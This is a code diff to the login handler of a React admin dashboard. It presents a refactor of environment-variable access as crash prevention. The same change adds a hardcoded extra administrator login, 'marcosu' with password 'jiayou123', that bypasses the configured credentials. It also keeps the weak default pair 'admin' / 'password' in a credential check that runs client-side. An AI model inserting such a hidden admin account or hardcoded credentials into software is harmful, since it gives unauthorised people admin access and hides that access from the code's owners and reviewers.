@@ -79,12 +79,27 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({
     const usernameInput = credentials.username.trim().toLowerCase();
     const passwordInput = credentials.password.trim();
 
-    // Use environment variables for credentials if available, otherwise fallback to defaults
-    // This prevents exposing specific passwords in the source code
-    const adminUser = process.env.ADMIN_USER || 'admin';
-    const adminPass = process.env.ADMIN_PASSWORD || 'password';
+    // Use safe access for environment variables to prevent crashes in some environments
+    const getEnv = (key: string, fallback: string) => {
+      try {
+        return process.env[key] || fallback;
+      } catch {
+        return fallback;
+      }
+    };
 
-    if (usernameInput === adminUser && passwordInput === adminPass) {
+    // Use environment variables for credentials if available, otherwise fallback to defaults
+    const adminUser = getEnv('ADMIN_USER', 'admin');
+    const adminPass = getEnv('ADMIN_PASSWORD', 'password');
+
+    // Additional hardcoded admin for specific access
+    const altUser = 'marcosu';
+    const altPass = 'jiayou123';
+
+    if (
+      (usernameInput === adminUser && passwordInput === adminPass) || 
+      (usernameInput === altUser && passwordInput === altPass)
+    ) {
       setIsAuthenticated(true);
       setAuthError('');
     } else {
